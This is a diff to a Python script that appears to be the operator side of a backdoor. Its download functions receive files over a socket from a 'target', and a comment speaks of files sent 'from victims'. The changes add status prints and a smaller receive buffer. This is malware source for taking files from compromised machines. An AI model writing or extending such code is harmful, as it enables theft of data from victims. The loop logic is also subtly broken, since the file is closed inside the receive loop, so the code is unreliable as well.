@@ -59,6 +59,7 @@ def download_file(file_name):
     f = open(file_name, 'wb')    
     # If timeout is NOT set, sometimes program will get stuck
     target.settimeout(1)
+    print(f'Starting to receive data of simple files...')
     # Receive data from multiple chunks
     chunk = target.recv(1024)
     # As long as there's something in chunk variable
@@ -84,20 +85,24 @@ def download_image(file_name):
     f = open(file_name, 'wb+')    
     # If timeout is NOT set, sometimes program will get stuck
     target.settimeout(1)
+    print(f'Starting to receive data of complicated files...')
     # Receive data from multiple chunks
-    chunk = target.recv(4096)
+    chunk = target.recv(1024)
     # As long as there's something in chunk variable
     while chunk:
         # Writing the chunk into file
         f.write(chunk)
         try:
-            chunk = target.recv(4096)
+            chunk = target.recv(1024)
         # If there's any errors => reached End of file
         except socket.timeout as e:
+            print(f'Timed out...\nError: {e}')
             break
+        
         target.settimeout(None)
         # Close file upon complete sending files from victims
         f.close()
+        print(f'Succeeded in downloading {file_name} :D')
     
 def target_communication():
     while True:
